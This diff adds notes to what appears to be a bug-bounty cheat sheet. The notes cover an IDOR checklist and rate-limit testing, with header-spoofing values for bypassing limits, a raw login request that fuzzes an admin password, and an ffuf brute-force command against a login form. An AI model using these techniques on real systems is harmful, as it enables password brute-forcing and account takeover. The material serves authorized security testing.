@@ -155,6 +155,17 @@
 </details>
 
 <details>
+	<summary>IDOR</summary>
+	
+    1- Look for id everywhere
+    2- Play with hash/encoded values
+    3- Change The ID's in the request 
+    4- 
+ 
+  
+</details>
+
+<details>
 	<summary>RCE</summary>
 </details>
 
@@ -182,6 +193,48 @@
 		
 </details>
 
+<details>
+	<summary>Rate Limit</summary>
+
+ 	rate limit 
+	1- no rate limit on login page 
+	2- no rate limit on internal password
+	3- no rate limit on sending reset password link 
+	4- no rate limit on OTP or 2FA => account takeover
+	5- no rate limit on contact us page 
+	6- no rate limit on comments 
+	7- no rate limit on reports of comments
+	8- no rate limit on port 22
+	
+	------------
+	bypass rate limit by adding headers 
+	X-Forwarded-For: 127.0.0.1
+	X-Forwarded-Host: 127.0.0.1
+	X-Origination-IP: 127.0.0.1 or 0.0.0.0
+	X-Fowarded-For: 127.0.0.1
+	X-Remote-IP: 127.0.0.1
+	X-Remote-Addr: 127.0.0.1
+	------------------------------------------
+	POST /login.php HTTP/1.1
+	Host: target.com
+	X-Forwarded-For: 127.0.0.1
+	X-Forwarded-Host: 127.0.0.1
+	X-Origination-IP: 127.0.0.1 or 0.0.0.0
+	X-Fowarded-For: 127.0.0.1
+	X-Remote-IP: 127.0.0.1
+	X-Remote-Addr: 127.0.0.1
+	
+	username=admin&password=$fuzz$
+	-------------------------------------------
+	429 => 403 
+	bypass rate limit 
+	
+	ffuf -u https://example.com -w wordlist.txt --data "username=admin&password=FUZZ"  -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"`
+	
+	403 
+
+
+</details>
 
 <details>
 ## <summary>hacking WordPress</summary>
